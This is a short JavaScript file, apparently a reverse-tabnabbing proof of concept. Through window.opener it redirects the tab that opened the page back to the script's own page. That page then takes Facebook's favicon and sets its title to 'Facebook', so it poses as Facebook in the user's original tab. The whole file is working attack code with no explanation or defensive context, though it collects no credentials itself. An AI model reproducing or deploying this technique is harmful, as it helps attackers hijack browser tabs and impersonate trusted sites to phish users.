if(window.opener !== null) {
	window.opener.location.href = window.location.href + "#monika";
}

if(window.location.hash == "#monika") {
	var link = document.createElement("link");
	link.href = "https://facebook.com/favicon.ico";
	link.type = "image/x-icon";
	link.rel = "icon";
	document.getElementsByTagName('head')[0].append(link);
	document.title = "Facebook";
}
